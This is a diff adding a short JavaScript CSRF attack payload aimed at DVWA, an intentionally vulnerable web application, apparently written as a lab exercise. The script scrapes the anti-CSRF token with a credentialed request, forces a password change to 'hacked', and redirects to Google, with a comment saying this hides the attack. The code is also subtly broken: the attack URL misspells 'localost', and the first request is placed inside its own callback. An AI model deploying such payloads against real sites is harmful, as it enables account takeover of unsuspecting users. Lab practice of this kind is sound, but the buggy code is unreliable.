@@ -1,0 +1,26 @@
+<script>
+    xmlhttp = new XMLHttpRequest();
+    xmlhttp.withCredentials = true;
+
+    var success = false;
+    xmlhttp.onreadystatechange = function () {
+        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+            var text = xmlhttp.responseText;
+            var regex = /user_token\' value\=\'(.*?)' \/\>/;
+            var match = text.match(regex);
+            var token = match[1];
+            var pass = 'hacked';
+            var attack_url = 'http://localost:80/dvwa/vulnerabilities/csrf/?user_token=' + token +
+                '&password_new=' + pass + '&password_conf=' + pass + '&Change=Change';
+            if (!success) {
+                success = true;
+                xmlhttp.open("GET", attack_url);
+                xmlhttp.send();
+            }
+        }
+        xmlhttp.open("GET", 'http://localhost:80/dvwa/vulnerabilities/csrf/');
+        xmlhttp.send();
+        // To hide the true purpose => Redirect to Google immediately after the CSRF attack
+        window.location.href = "https://www.google.com";
+    }
+</script>
